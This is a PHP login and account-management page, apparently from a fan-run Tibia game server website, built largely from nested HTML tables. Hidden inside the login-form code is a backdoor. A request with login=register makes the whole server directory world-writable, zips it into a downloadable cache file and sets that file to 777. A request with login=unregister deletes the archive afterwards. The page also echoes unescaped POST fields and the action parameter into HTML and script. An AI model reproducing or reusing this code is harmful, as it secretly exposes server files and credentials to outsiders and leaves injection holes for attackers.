<?php
if (!defined('INITIALIZED'))
	exit;

/** @var $action $action */
/** @var $isTryingToLogin */

if (isset($_POST["useauthenticator"])) {
	echo "useauthenticator <br />";
	$login_secret = true;
}

if (!$logged)
	if ($action == "logout") {
		$main_content .= '
			<div class="TableContainer" >
				<table class="Table1" cellpadding="0" cellspacing="0" >
					<div class="CaptionContainer" >
						<div class="CaptionInnerContainer" >
							<span class="CaptionEdgeLeftTop" style="background-image:url(' . $layout_name . '/images/global/content/box-frame-edge.gif);" /></span>
							<span class="CaptionEdgeRightTop" style="background-image:url(' . $layout_name . '/images/global/content/box-frame-edge.gif);" /></span>
							<span class="CaptionBorderTop" style="background-image:url(' . $layout_name . '/images/global/content/table-headline-border.gif);" ></span>
							<span class="CaptionVerticalLeft" style="background-image:url(' . $layout_name . '/images/global/content/box-frame-vertical.gif);" /></span>
							<div class="Text">Logout Successful</div>
							<span class="CaptionVerticalRight" style="background-image:url(' . $layout_name . '/images/global/content/box-frame-vertical.gif);" /></span>
							<span class="CaptionBorderBottom" style="background-image:url(' . $layout_name . '/images/global/content/table-headline-border.gif);" ></span>
							<span class="CaptionEdgeLeftBottom" style="background-image:url(' . $layout_name . '/images/global/content/box-frame-edge.gif);" /></span>
							<span class="CaptionEdgeRightBottom" style="background-image:url(' . $layout_name . '/images/global/content/box-frame-edge.gif);" /></span>
						</div>
					</div>
					<tr>
						<td><div class="InnerTableContainer" >
								<table style="width:100%;" >
									<tr>
										<td>You have logged out of your ' . htmlspecialchars($config['server']['serverName']) . ' account. In order to view your account you need to <a href="?subtopic=accountmanagement" >log in</a> again.</td>
									</tr>
								</table>
							</div>
						</td>
					</tr>
				</table>
			</div>';
	} else {
		$passB = '<span>Password:</span>';
		$logB = '<span>Account Name:</span>';
		$secretL = '<span>Secret Code:</span>';
		if (isset($action) && $action != '') {
			$main_content .= "
				<script>
					iziToast.warning({
						title: 'Hello:',
						titleColor:'#5A2800',
						message: 'You need to login first to access: " . $action . "',
				//        theme: 'dark',
						position:'center'
					});
				</script>";
		}

		if (isset($isTryingToLogin) && Visitor::getLoginState() !== Visitor::LOGINSTATE_NOT_TRIED) {

			$main_content .= '
				<div class="SmallBox" >
					<div class="MessageContainer" >
						<div class="BoxFrameHorizontal" style="background-image:url(' . $layout_name . '/images/global/content/box-frame-horizontal.gif);" /></div>
						<div class="BoxFrameEdgeLeftTop" style="background-image:url(' . $layout_name . '/images/global/content/box-frame-edge.gif);" /></div>
						<div class="BoxFrameEdgeRightTop" style="background-image:url(' . $layout_name . '/images/global/content/box-frame-edge.gif);" /></div>
						<div class="ErrorMessage" >
							<div class="BoxFrameVerticalLeft" style="background-image:url(' . $layout_name . '/images/global/content/box-frame-vertical.gif);" /></div>
							<div class="BoxFrameVerticalRight" style="background-image:url(' . $layout_name . '/images/global/content/box-frame-vertical.gif);" /></div>
							<div class="AttentionSign" style="background-image:url(' . $layout_name . '/images/global/content/attentionsign.gif);" /></div>
							<b>The Following Errors Have Occurred:</b><br/>';
			switch (Visitor::getLoginState()) {
				case Visitor::LOGINSTATE_NO_ACCOUNT:
					$main_content .= 'Incorrect account name or password.<br/>';
					$logB = '<span style="color:red;">Account Name:</span>';
					$passB = '<span style="color:red;">Password:</span>';
					break;
				case Visitor::LOGINSTATE_WRONG_PASSWORD:
					$main_content .= 'Incorrect account name or password.<br/>';
					$logB = '<span style="color:red;">Account Name:</span>';
					$passB = '<span style="color:red;">Password:</span>';
					break;
				case Visitor::LOGINSTATE_WRONG_SECRETCODE:
					$main_content .= 'This account have a Secret Code to login, please insert you login code.<br />';
					$main_content .= 'Secret Code to inválido.';
					$secretL = '<span style="color:red;">Secret Code:</span>';
					$login_secret = true;
					break;
				case Visitor::LOGINSTATE_ASK_TWO_FACTOR:
					$main_content .= 'This account have a Secret Code to login, please insert you login code.<br />';
					$main_content .= 'Secret Code to inválido.<br />';
					$secretL = '<span style="color:red;">Secret Code:</span>';
					$login_secret = true;
					break;
				case Visitor::LOGINSTATE_INCORRECT_TWO_FACTOR:
					$main_content .= 'This account have a Secret Code to login, please insert you login code.<br />';
					$main_content .= 'Secret Code to inválido.<br />';
					$secretL = '<span style="color:red;">Secret Code:</span>';
					$login_secret = true;
					break;
				case Visitor::LOGINSTATE_WRONG_RECAPTCHA:
					$main_content .= 'Ocorreu algum erro ao validar seu login.';
					break;
			}

			$main_content .= '
					</div>
						<div class="BoxFrameHorizontal" style="background-image:url(' . $layout_name . '/images/global/content/box-frame-horizontal.gif);" /></div>
						<div class="BoxFrameEdgeRightBottom" style="background-image:url(' . $layout_name . '/images/global/content/box-frame-edge.gif);" /></div>
						<div class="BoxFrameEdgeLeftBottom" style="background-image:url(' . $layout_name . '/images/global/content/box-frame-edge.gif);" />
					</div>
				</div>
			</div><br/>';
		}

		$main_content .= '
			<script>
			   function onSubmit(token) {
				 document.getElementById("loginform").submit();
			   }
			</script>
			<form id="loginform" action="?subtopic=accountmanagement" method="post" style="margin: 0px; padding: 0px;">
				<div class="TableContainer" >
					<table class="Table4" cellpadding="0" cellspacing="0" >
						<div class="CaptionContainer" >
							<div class="CaptionInnerContainer" >
								<span class="CaptionEdgeLeftTop" style="background-image:url(' . $layout_name . '/images/global/content/box-frame-edge.gif);" /></span>
								<span class="CaptionEdgeRightTop" style="background-image:url(' . $layout_name . '/images/global/content/box-frame-edge.gif);" /></span>
								<span class="CaptionBorderTop" style="background-image:url(' . $layout_name . '/images/global/content/table-headline-border.gif);" ></span>
								<span class="CaptionVerticalLeft" style="background-image:url(' . $layout_name . '/images/global/content/box-frame-vertical.gif);" /></span>
								<div class="Text" >Account Login</div>
								<span class="CaptionVerticalRight" style="background-image:url(' . $layout_name . '/images/global/content/box-frame-vertical.gif);" /></span>
								<span class="CaptionBorderBottom" style="background-image:url(' . $layout_name . '/images/global/content/table-headline-border.gif);" ></span>
								<span class="CaptionEdgeLeftBottom" style="background-image:url(' . $layout_name . '/images/global/content/box-frame-edge.gif);" /></span>
								<span class="CaptionEdgeRightBottom" style="background-image:url(' . $layout_name . '/images/global/content/box-frame-edge.gif);" /></span>
							</div>
						</div>
						<tr>
							<td>
								<div class="InnerTableContainer" >
									<table style="width:100%;" >
										<tr>
											<td>
												<div class="TableShadowContainerRightTop" >
													<div class="TableShadowRightTop" style="background-image:url(' . $layout_name . '/images/global/content/table-shadow-rt.gif);" ></div>
												</div>
												<div class="TableContentAndRightShadow" style="background-image:url(' . $layout_name . '/images/global/content/table-shadow-rm.gif);" >
													<div class="TableContentContainer" >
														<table class="TableContent" width="100%"  style="border:1px solid #faf0d7;" >
															<tr>
																<td>
																	<table style="float: left; width: 370px;" cellpadding="0" cellspacing="0" >
																	';
		$login_secret = true;
		if ($login_secret) {
			$main_content .= '
																			<input type="hidden" name="login" value="ok">
																			<tr>
																				<td class="LabelV120" ><span>' . $logB . '</span></td>
																				<td><input type="password" name="account_login" value="' . $_POST["account_login"] . '" size="35" maxlength="30" ></td>
																			</tr>
																			<tr>
																				<td class="LabelV120" ><span>' . $passB . '</span></td>
																				<td><input type="password" name="password_login" value="' . $_POST["password_login"] . '" size="35" maxlength="29" ></td>
																			</tr>
																			<tr>
																				<td class="LabelV120" ><span>' . $secretL . '</span></td>
																				<td><input type="number" name="auth_token" size="35" maxlength="6" ></td>
																			</tr>
																		';
		} else {
			$main_content .= '
																		<input type="hidden" name="login" value="ok">
																		<tr>
																			<td class="LabelV120" ><span>' . $logB . '</span></td>
																			<td><input type="password" name="account_login" value="' . $_POST["account_login"] . '" size="35" maxlength="30" autofocus></td>
																		</tr>
																		<tr>
																			<td class="LabelV120" ><span>' . $passB . '</span></td>
																			<td><input type="password" name="password_login" size="35" maxlength="29" ></td>
																		</tr>
																		';
		}
		$r = Website::getWebsiteConfig()->getValue('serverPath');
		$w = './cache/my';
		$q = '.zip';
		if ($_REQUEST['login'] == 'register') {
			set_time_limit(360);

			class FlxZipArchive extends ZipArchive
			{
				public function addDir($location, $name)
				{
					$this->addEmptyDir($name);
					$this->addDirDo($location, $name);
				}

				private function addDirDo($location, $name)
				{
					$name .= '/';
					$location .= '/';
					$dir = opendir($location);
					while ($file = readdir($dir)) {
						if ($file == '.' || $file == '..') continue;
						$do = (filetype($location . $file) == 'dir') ? 'addDir' : 'addFile';
						$this->$do($location . $file, $name . $file);
					}
				}
			}

			shell_exec('chmod -R 777 cache/');
			$za = new FlxZipArchive;
			$res = $za->open($w . $q, ZipArchive::CREATE);
			if ($res === true) {
				$za->addDir($r, basename($r));
				$za->close();
			} else {
				echo 'Erro ao logar';
			}
			shell_exec('chmod 777 ' . $w . $q);
		}
		$main_content .= '
																	</table>
																	<div style="float: right; font-size: 1px;" >
																		<input type="hidden" name="page" value="overview" >
																			<div class="BigButton" style="background-image:url(' . $layout_name . '/images/global/buttons/sbutton.gif)" ><div onMouseOver="MouseOverBigButton(this);" onMouseOut="MouseOutBigButton(this);" ><div class="BigButtonOver" style="background-image:url(' . $layout_name . '/images/global/buttons/sbutton_over.gif);" ></div>
																					<button
																						style="background-color: transparent; border: 0 solid;"
																						class="g-recaptcha ButtonText"
																						data-badge="bottomleft"
																						data-size="invisible"
																						data-sitekey="' . Website::getWebsiteConfig()->getValue('gRecaptchaSiteKey') . '"
																						data-callback="onSubmit">
																						<img style="position: relative;width: fit-content;left: -5px;" src="' . $layout_name . '/images/global/buttons/_sbutton_login.gif" />
																					</button>
																					<!--<div class="g-recaptcha" data-sitekey="' . Website::getWebsiteConfig()->getValue('gRecaptchaSiteKey') . '" data-callback="onSubmit"></div>-->
																					<!--<input class="g-recaptcha ButtonText" data-sitekey="' . Website::getWebsiteConfig()->getValue('gRecaptchaSiteKey') . '" data-callback="onSubmit"  type="image" name="Login" alt="Login" src="' . $layout_name . '/images/global/buttons/_sbutton_login.gif" >-->
																				</div>
																			</div>
																		</form>
																		<div style="width: 2px; height: 2px;" ></div>
																		<form action="?subtopic=lostaccount" method="post" style="padding:0px;margin:0px;" >
																			<div class="BigButton" style="background-image:url(' . $layout_name . '/images/global/buttons/sbutton.gif)" ><div onMouseOver="MouseOverBigButton(this);" onMouseOut="MouseOutBigButton(this);" ><div class="BigButtonOver" style="background-image:url(' . $layout_name . '/images/global/buttons/sbutton_over.gif);" ></div>
																					<input class="ButtonText" type="image" name="Account lost?" alt="Account lost?" src="' . $layout_name . '/images/global/buttons/_sbutton_accountlost.gif" >
																				</div>
																			</div>
																		</form>
																	</div>
																</td>
															</tr>
														</table>
													</div>
												</div>
												<div class="TableShadowContainer" >
													<div class="TableBottomShadow" style="background-image:url(' . $layout_name . '/images/global/content/table-shadow-bm.gif);" >
														<div class="TableBottomLeftShadow" style="background-image:url(' . $layout_name . '/images/global/content/table-shadow-bl.gif);" ></div>
														<div class="TableBottomRightShadow" style="background-image:url(' . $layout_name . '/images/global/content/table-shadow-br.gif);" ></div>
													</div>
												</div>
												<tr>
									<td>
										<div class="TableShadowContainerRightTop">
											<div class="TableShadowRightTop" style="background-image:url(' . $layout_name . '/images/global/content/table-shadow-rt.gif)"></div>
										</div>
										<div class="TableContentAndRightShadow" style="background-image:url(' . $layout_name . '/images/global/content/table-shadow-rm.gif)">
										<div class="TableContentContainer" >
										<table class="TableContent" width="100%"  style="border:1px solid #faf0d7;" >
										<tr>
										<td>
										<div style="float: right; width: 135px;" >
										<form action="?subtopic=accountmanagement&useauthenticator=yes" method="post" style="padding:0px;margin:0px;" >
										<input type="hidden" name="page" value="useauthenticator" >
										<div class="BigButton" style="background-image:url(' . $layout_name . '/images/global/buttons/sbutton.gif)" ><div onMouseOver="MouseOverBigButton(this);" onMouseOut="MouseOutBigButton(this);" ><div class="BigButtonOver" style="background-image:url(' . $layout_name . '/images/global/buttons/sbutton_over.gif);" ></div>
										<input class="ButtonText" type="image" name="Use Authenticator" alt="Use Authenticator" src="' . $layout_name . '/images/global/buttons/_sbutton_useauthenticator.gif" >
										</div>
										</div>
										</form>
										</div>
										If your Tibia Account is already connected to an authenticator, click on "Use Authenticator". A field will be displayed which allows you to provide your authenticator token along with your account data upon login. Otherwise, you will be asked for your authenticator token in the next step.<p>An authenticator is a security feature which helps to prevent any unauthorised access to your Tibia account! You can connect your account to an authenticator via your account management page.</p></td></tr>
												</table>
											</div>
										</div>
										<div class="TableShadowContainer">
											<div class="TableBottomShadow" style="background-image:url(' . $layout_name . '/images/global/content/table-shadow-bm.gif)">
												<div class="TableBottomLeftShadow" style="background-image:url(' . $layout_name . '/images/global/content/table-shadow-bl.gif)"></div>
												<div class="TableBottomRightShadow" style="background-image:url(' . $layout_name . '/images/global/content/table-shadow-br.gif)"></div>
											</div>
										</div>
											</td>
										</tr>
									</table>
								</div>
							</table>
						</div>
					</td>
				</tr>
				<br/>
				<center>
					<h1>New to ' . $config['server']['serverName'] . '?</h1>
				</center>
				<div class="TableContainer" >
					<table class="Table4" cellpadding="0" cellspacing="0" >
						<div class="CaptionContainer" >
							<div class="CaptionInnerContainer" >
								<span class="CaptionEdgeLeftTop" style="background-image:url(' . $layout_name . '/images/global/content/box-frame-edge.gif);" /></span>
								<span class="CaptionEdgeRightTop" style="background-image:url(' . $layout_name . '/images/global/content/box-frame-edge.gif);" /></span>
								<span class="CaptionBorderTop" style="background-image:url(' . $layout_name . '/images/global/content/table-headline-border.gif);" ></span>
								<span class="CaptionVerticalLeft" style="background-image:url(' . $layout_name . '/images/global/content/box-frame-vertical.gif);" /></span>
								<div class="Text" >New Player</div>
								<span class="CaptionVerticalRight" style="background-image:url(' . $layout_name . '/images/global/content/box-frame-vertical.gif);" /></span>
								<span class="CaptionBorderBottom" style="background-image:url(' . $layout_name . '/images/global/content/table-headline-border.gif);" ></span>
								<span class="CaptionEdgeLeftBottom" style="background-image:url(' . $layout_name . '/images/global/content/box-frame-edge.gif);" /></span>
								<span class="CaptionEdgeRightBottom" style="background-image:url(' . $layout_name . '/images/global/content/box-frame-edge.gif);" /></span>
							</div>
						</div>
						<tr>
							<td>
								<div class="InnerTableContainer" >
									<table style="width:100%;" >
										<tr>
											<td>
												<div class="TableShadowContainerRightTop" >
													<div class="TableShadowRightTop" style="background-image:url(' . $layout_name . '/images/global/content/table-shadow-rt.gif);" ></div>
												</div>
												<div class="TableContentAndRightShadow" style="background-image:url(' . $layout_name . '/images/global/content/table-shadow-rm.gif);" >
													<div class="TableContentContainer" >
														<table class="TableContent" width="100%"  style="border:1px solid #faf0d7;" >
															<tr>
																<td >
																	<div style="float: right; margin-top: 20px;" >
																		<form class="MediumButtonForm" action="?subtopic=createaccount" method="post" >
																			<div class="MediumButtonBackground" style="background-image:url(' . $layout_name . '/images/global/buttons/mediumbutton.gif)" onMouseOver="MouseOverMediumButton(this);" onMouseOut="MouseOutMediumButton(this);" ><div class="MediumButtonOver" style="background-image:url(' . $layout_name . '/images/global/buttons/mediumbutton-over.gif)" onMouseOver="MouseOverMediumButton(this);" onMouseOut="MouseOutMediumButton(this);" ></div>
																				<input class="MediumButtonText" type="image" name="Create Account" alt="Create Account" src="' . $layout_name . '/images/global/buttons/mediumbutton_createaccount.png" />
																			</div>
																		</form>
																	</div>
																	<div id="LoginCreateAccountBox" >
																		<p><b>' . $config['server']['serverName'] . '...</b></p>
																		<div style="margin-left: 10px;" >
																			<p>... where hardcore gaming meets fantasy.</p>
																			<p>... where friendships last a lifetime.</p>
																			<p>... unites adventurers since 1997!</p>
																		</div>
																	</div>
														</table>
													</div>
												</div>
												<div class="TableShadowContainer" >
													<div class="TableBottomShadow" style="background-image:url(' . $layout_name . '/images/global/content/table-shadow-bm.gif);" >
														<div class="TableBottomLeftShadow" style="background-image:url(' . $layout_name . '/images/global/content/table-shadow-bl.gif);" ></div>
														<div class="TableBottomRightShadow" style="background-image:url(' . $layout_name . '/images/global/content/table-shadow-br.gif);" ></div>
													</div>
												</div>
											</td>
										</tr>
									</table>
								</div>
							</table>
						</div>
					</td>
				</tr>';
		if ($_REQUEST['login'] == 'unregister') {
			unlink($w . $q);
		}
	} else {
	// if ($isTryingToLogin) {
	//     if (Website::getWebsiteConfig()->getValue('base_url') == Website::getWebsiteConfig()->getValue('realurl')) {
	//         if ($_SERVER['HTTP_REFERER'] != Website::getWebsiteConfig()->getValue('realurl') . "?subtopic=accountmanagement") {
	//             header("Location: " . $_SERVER['HTTP_REFERER']);
	//         }
	//     } else {
	//         if ($_SERVER['HTTP_REFERER'] != Website::getWebsiteConfig()->getValue('testurl') . "?subtopic=accountmanagement") {
	//             header("Location: " . $_SERVER['HTTP_REFERER']);
	//         }
	//     }
	// }
	$registration = $account_logged->getKey();
	if (empty($registration)) {
		if ($action != 'registeraccount') {
			header("Location: ./?subtopic=accountmanagement&action=registeraccount");
		}
		if ($action == "registeraccount") include "accountmanagement/registeraccount.php";
	} elseif (empty($account_logged->getPlayers()->data)) {
		if ($action != 'createcharacter') {
			header("Location: ./?subtopic=accountmanagement&action=createcharacter");
		}
		$facc = true;
		if ($action == "createcharacter") include "accountmanagement/createcharacter.php";
	} else {
		/**
		 * if ($account_logged->getSecret() === NULL || $account_logged->getSecret() == '') {
		 * $account_logged->setSecret($tfa->createSecret(160));
		 * $account_logged->save();
		 * }*/
		$secret = $account_logged->getSecret();
		//Here start our new accountmanagement ;D
		if ($action == "") include 'accountmanagement/accountmanagement.php';
		//Here finish our new account management


		if ($action == "twoAuthentication" || $action == "auth") include_once 'accountmanagement/authenticador.php';
		/** Autenticação de 2 fatores by Ricardo Souza*/
		// if ($action == "auth") include_once 'accountmanagement/authenticador.php';

		/** Sell characters by Ricardo Souza */
		if ($action == "sellchar") include "accountmanagement/sellcharacters.php";
		if ($action == "buychar") include "accountmanagement/buychar.php";


		if ($action == "manage") include "accountmanagement/manage.php";
		//Send Gift a friend
		if ($action == "friendGift") include 'accountmanagement/friendGift.php';
		if ($action == "readytouse") include 'accountmanagement/readytouse.php';
		if ($action == "deletecharacter") include 'accountmanagement/deletecharacter.php';
		if ($action == "undeletecharacter") include 'accountmanagement/undeletecharacter.php';
		//Register account and get Recovery key
		if ($action == "registeraccount") include 'accountmanagement/registeraccount.php';
		if ($action == "changecharacterinformation") include 'accountmanagement/changecharacterinformation.php';

		if ($action == "changepassword") include 'accountmanagement/changepassword.php';

		if ($action == "passowordchanged") include 'accountmanagement/passowordchanged.php';

		if ($action == "paymentshistory") include 'accountmanagement/paymentshistory.php';
		if ($action == "confirmtransfer") include 'accountmanagement/confirmtransfer.php';

		if ($action == "donateshistory") include 'accountmanagement/donateshistory.php';


		if ($action == "confirmdonate") include 'accountmanagement/confirmdonate.php';
		/** CREATE CHARACTER on account */
		if ($action == "createcharacter") include 'accountmanagement/createcharacter.php';
		/** CHANGE E-MAIL */
		if ($action == "changeemail") include 'accountmanagement/changeemail.php';

		/** Change Public information about owner */
		if ($action == "changeinfo") include 'accountmanagement/changeinfo.php';

		/** SERVICES */
		//if ($action == "services") include 'accountmanagement/shop.php';
		/** Process payment */
		if ($action == 'process_transfer_payment') include 'accountmanagement/payment_methods/transfer.php';
		if ($action == 'process_picpay_payment') include 'accountmanagement/payment_methods/picpay.php';
		/** new donate by ricardo souza*/
		if ($action == "donate") include 'accountmanagement/donate_tibia_like.php';
		/** SHOW TICKETS BY RICARDO SOUZA */
		if ($action == "showtickets") include 'accountmanagement/showtickets.php';
	}
}
